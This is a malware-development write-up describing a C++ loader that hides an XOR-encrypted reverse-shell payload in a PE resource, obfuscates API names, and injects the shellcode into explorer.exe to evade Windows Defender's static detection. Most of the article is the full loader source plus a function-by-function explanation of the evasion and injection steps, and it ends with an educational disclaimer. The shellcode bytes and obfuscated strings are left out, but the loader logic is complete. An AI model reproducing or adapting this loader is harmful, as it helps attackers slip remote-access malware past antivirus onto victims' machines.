
# Bypassing Windows Defender Static Detection

## Introduction

In this article, I’ll walk you through how I bypassed the **static detection** of Windows Defender. Currently, I haven’t managed to evade dynamic detection, but I aim to achieve full evasion in the coming months.

To accomplish this, I leaned heavily on the excellent **Malware Development Essentials** course from [Sektor7](https://institute.sektor7.net/). It’s an incredibly informative course on low-level malware development. What follows is essentially the final project I completed as part of this training.

---

## Overview

### Objective

Inject a reverse shell payload into `explorer.exe` while avoiding static detection by Windows Defender.

### Key Evasion Techniques

- Store the payload in the `.rsrc` section of the PE file.
- Encrypt the payload using XOR.
- Obfuscate API calls using `GetProcAddress` and `GetModuleHandle`.
- Encrypt suspicious strings using XOR.

---

![image](https://github.com/user-attachments/assets/77a0f8f8-3a16-45b5-99f6-53806998c853)

## Code Breakdown

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

// Function pointers for API calls
LPVOID (WINAPI * allocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
BOOL (WINAPI * writeMem)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
HANDLE (WINAPI * createThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

char key[] = "mysecretkeee";
char key2[] = "s12";

// XOR encryption/decryption
void XOR(char * data, size_t len, char * key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] ^= key[j++];
    }
}

// Find process ID of target
int FindTarget(const char *procname) {
    PROCESSENTRY32 pe32;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }

    while (Process32Next(snapshot, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            CloseHandle(snapshot);
            return pe32.th32ProcessID;
        }
    }

    CloseHandle(snapshot);
    return 0;
}

// Inject payload into process
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
    unsigned char s_allocEx[] = { /* obfuscated bytes */ };
    unsigned char s_writeMem[] = { /* obfuscated bytes */ };
    unsigned char s_createThread[] = { /* obfuscated bytes */ };

    XOR((char *) s_allocEx, sizeof(s_allocEx), key2, sizeof(key2));
    XOR((char *) s_writeMem, sizeof(s_writeMem), key2, sizeof(key2));
    XOR((char *) s_createThread, sizeof(s_createThread), key2, sizeof(key2));

    allocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), s_allocEx);
    writeMem = GetProcAddress(GetModuleHandle("kernel32.dll"), s_writeMem);
    createThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_createThread);

    LPVOID remote = allocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    writeMem(hProc, remote, payload, payload_len, NULL);

    HANDLE hThread = createThread(hProc, NULL, 0, remote, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

// Main execution
int main(void) {
    void * exec_mem;
    HANDLE hProc;
    DWORD oldprotect;
    unsigned char * payload;
    unsigned int payload_len;

    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    HGLOBAL resHandle = LoadResource(NULL, res);
    payload = (char *) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(exec_mem, payload, payload_len);
    XOR((char *) exec_mem, payload_len, key, sizeof(key));

    printf("Ready to inject. Press Enter to continue...
");
    getchar();

    int pid = FindTarget("explorer.exe");
    if (pid) {
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (hProc) {
            Inject(hProc, exec_mem, payload_len);
            CloseHandle(hProc);
        }
    }

    return 0;
}
```

---

## Payload

The reverse shell payload is not included directly in the source. Instead, it's stored in the `.rsrc` section of the PE file. Learn more about this technique in this writeup:

> 📖 [Storing Payload in PE File (Medium article)](https://medium.com)

## Function Breakdown

The malware is composed of four primary functions:

### 1. `XOR`
This function performs a simple XOR encryption/decryption on a data buffer using a provided key. While often referred to as encoding, the use of a key classifies this operation as encryption. The function iterates through the data, applying the XOR operation with the repeating key to obfuscate or reveal the payload.

### 2. `FindTarget`
This function takes the name of a process as input and returns its Process ID (PID). It leverages `CreateToolhelp32Snapshot` to list all running processes, and uses `Process32First` and `Process32Next` to iterate through them. If the specified process name matches, it extracts and returns the corresponding PID.

### 3. `Inject`
This function handles shellcode injection into a target process. It performs three key steps:
- **Memory Allocation**: Allocates memory in the remote process using `VirtualAllocEx`.
- **Payload Writing**: Writes the shellcode into the allocated memory with `WriteProcessMemory`.
- **Execution**: Executes the shellcode using `CreateRemoteThread`.

### 4. `main`
The `main` function serves as the entry point. It:
- Extracts an encrypted shellcode payload from the `.rsrc` section (`favicon.ico`).
- Allocates local memory with `VirtualAlloc`.
- Copies and decrypts the payload using the `XOR` function.
- Finds the PID of `explorer.exe` using `FindTarget`.
- Injects the decrypted payload into `explorer.exe` using `Inject`.

The approach ensures the shellcode is hidden from static analysis via resource embedding and encryption, and uses remote thread creation for execution within a trusted process context.


---

## Result

After compiling the binary and scanning it with Windows Defender, it triggers detection when executed — **not** on static scan. This demonstrates that static evasion is working as intended. The reverse shell is launched only when `explorer.exe` is active and undisturbed.

---

## POC

![image](https://github.com/user-attachments/assets/897a9e0e-2789-4b7d-bce3-d101baded034)

## Conclusion

This project is a practical example of basic static detection evasion for educational purposes. I hope it helps anyone learning about red teaming and malware development.

More to come — including full evasion from Windows Defender.

— **Malforge Group**

---

> **Disclaimer:** This is for educational and ethical hacking purposes only. Never use this knowledge for illegal activities.
